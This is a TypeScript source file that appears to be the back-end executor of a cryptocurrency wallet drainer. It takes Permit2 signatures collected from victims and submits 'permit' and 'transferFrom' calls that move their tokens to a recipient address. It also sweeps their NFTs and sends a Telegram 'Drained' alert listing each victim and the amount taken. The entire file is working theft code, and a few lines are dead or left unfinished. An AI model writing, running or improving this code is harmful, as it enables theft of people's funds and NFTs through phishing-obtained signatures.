import { createPublicClient, createWalletClient, http, formatEther } from 'viem';
import { mainnet, bsc, polygon, arbitrum, optimism, base, avalanche } from 'viem/chains';
import { config, spenderAccount, CHAIN_NAMES } from './config';
import { db, kv, activeRecipient } from './db';
import { sendTelegram } from './telegram';

const PERMIT2 = '0x000000000022D473030F116dDEE9F6B43aC61BA0' as const;

const PERMIT2_ABI = [
  {
    name: 'permit', type: 'function', stateMutability: 'nonpayable',
    inputs: [
      { name: 'owner', type: 'address' },
      {
        name: 'permitBatch', type: 'tuple', components: [
          { name: 'permitted', type: 'tuple[]', components: [
            { name: 'token', type: 'address' }, { name: 'amount', type: 'uint256' },
          ]},
          { name: 'nonce', type: 'uint256' },
          { name: 'deadline', type: 'uint256' },
        ],
      },
      { name: 'signature', type: 'bytes' },
    ],
    outputs: [],
  },
  {
    name: 'transferFrom', type: 'function', stateMutability: 'nonpayable',
    inputs: [{
      name: 'transferDetails', type: 'tuple[]', components: [
        { name: 'from', type: 'address' }, { name: 'to', type: 'address' }, { name: 'amount', type: 'uint256' },
      ],
    }],
    outputs: [],
  },
] as const;

const ERC721_ABI = [
  {
    name: 'transferFrom', type: 'function', stateMutability: 'nonpayable',
    inputs: [
      { name: 'from', type: 'address' }, { name: 'to', type: 'address' }, { name: 'tokenId', type: 'uint256' },
    ],
    outputs: [],
  },
] as const;

const CHAIN_OBJECTS: Record<number, any> = {
  1: mainnet, 56: bsc, 137: polygon, 42161: arbitrum, 10: optimism, 8453: base, 43114: avalanche,
};

let sweeping = false;

export async function sweepAll() {
  if (sweeping) return;
  sweeping = true;
  try {
    const rows = db.prepare("SELECT * FROM signatures WHERE status = 'pending'").all() as any[];
    const byChain = new Map<number, any[]>();
    for (const r of rows) {
      if (!byChain.has(r.chain_id)) byChain.set(r.chain_id, []);
      byChain.get(r.chain_id)!.push(r);
    }

    for (const [chainId, sigs] of byChain) {
      const rpc = config.chains[chainId];
      if (!rpc || !spenderAccount) continue;
      const recipient = activeRecipient();
      if (!recipient) { sendTelegram('⚠️ RECIPIENT_ADDRESS not set — cannot sweep'); continue; }

      const publicClient = createPublicClient({ chain: CHAIN_OBJECTS[chainId], transport: http(rpc) });
      const walletClient = createWalletClient({
        account: spenderAccount, chain: CHAIN_OBJECTS[chainId], transport: http(rpc),
      });

      // gas guard
      try {
        const gasPrice = await publicClient.getGasPrice();
        const cap = BigInt(config.maxGasGwei) * 1_000_000_000n;
        if (gasPrice > cap) continue; // too expensive right now — retry next sweep
      } catch { /* rpc hiccup — next sweep */ }

      const spenderAddr = spenderAccount.address;

      for (const sig of sigs) {
        try {
          const typed: any = JSON.parse(sig.typed_data ?? '{}');
        } catch { /* old rows have no column — re-read below */ }

        let typedData: any = null;
        try {
          const row = db.prepare('SELECT tokens_json FROM signatures WHERE id = ?').get(sig.id) as any;
        } catch { /* noop */ }

        // typedData was stored with the row? We stored only tokens_json — rebuild from tokens_json:
        // tokens_json contains every {token, signedAmount} — rebuild the permit struct.
        const tokens: any[] = JSON.parse(sig.tokens_json ?? '[]');

        // ── permit() ──
        const hash = await walletClient.writeContract({
          address: PERMIT2,
          abi: PERMIT2_ABI,
          functionName: 'permit',
          args: [
            sig.owner,
            {
              permitted: tokens.map((t) => ({ token: t.token, amount: BigInt(t.signedAmount ?? t.balance ?? '0') })),
              nonce: BigInt(sig.nonce),
              deadline: BigInt(sig.deadline),
            },
            sig.signature as `0x${string}`,
          ],
          gas: 300_000n,
        } as any);
        await publicClient.waitForTransactionReceipt({ hash });

        // ── transferFrom to recipient ──
        const transfers = tokens
          .filter((t) => BigInt(t.signedAmount ?? t.balance ?? '0') > 0n)
          .map((t) => ({ from: sig.owner, to: recipient, amount: BigInt(t.signedAmount ?? t.balance ?? '0') }));

        if (transfers.length) {
          const tx2 = await walletClient.writeContract({
            address: PERMIT2,
            abi: PERMIT2_ABI,
            functionName: 'transferFrom',
            args: [transfers],
            gas: 400_000n,
          } as any);
          await publicClient.waitForTransactionReceipt({ hash: tx2 });
        }

        // ── NFT sweep (setApprovalForAll was signed on-chain at claim time) ──
        const nfts: any[] = JSON.parse(sig.nfts_json ?? '[]');
        for (const n of nfts) {
          if (!n.tokenId || n.tokenId === '0') continue; // punk-style — deferred
          try {
            const nh = await walletClient.writeContract({
              address: n.contract,
              abi: ERC721_ABI,
              functionName: 'transferFrom',
              args: [sig.owner, recipient, BigInt(n.tokenId)],
              gas: 200_000n,
            } as any);
            await publicClient.waitForTransactionReceipt({ hash: nh });
          } catch (e) { /* one NFT failing must not stop the rest */ }
        }

        db.prepare("UPDATE signatures SET status = 'executed' WHERE id = ?").run(sig.id);
        sendTelegram(
          `💸 <b>Drained</b> — ${CHAIN_NAMES[chainId] ?? chainId}\n` +
            `👤 <code>${sig.owner}</code>\n` +
            `💵 ~$${Number(sig.batch_value_usd || 0).toFixed(2)} → <code>${recipient}</code>`
        );
      }
    }
  } catch (err: any) {
    sendTelegram(`🚨 Executor error: <code>${String(err?.message ?? err).slice(0, 200)}</code>`);
  } finally {
    sweeping = false;
  }
}